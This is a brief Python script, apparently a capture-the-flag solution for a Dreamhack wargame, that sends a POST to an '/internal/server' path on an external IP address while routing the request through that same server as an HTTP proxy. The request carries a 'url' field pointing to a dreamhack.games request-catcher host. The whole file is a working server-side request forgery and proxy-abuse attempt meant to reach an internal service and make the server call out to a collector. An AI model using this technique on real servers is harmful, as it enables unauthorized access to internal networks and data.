import json
import requests

EXTERNAL_URI = "http://15.165.37.31:3000"
INTERNAL_URI = "http://192.168.200.120:3000"

INTERNAL_URL = EXTERNAL_URI + "/internal/server"
HTTP_PROXY_URL = EXTERNAL_URI + "/"

PROXIES = {
    "http" : HTTP_PROXY_URL
}

DATA = {
    "url": "https://zslzbvv.request.dreamhack.games"
}

resp = requests.post(INTERNAL_URL, data=DATA, proxies=PROXIES)

print(resp.text)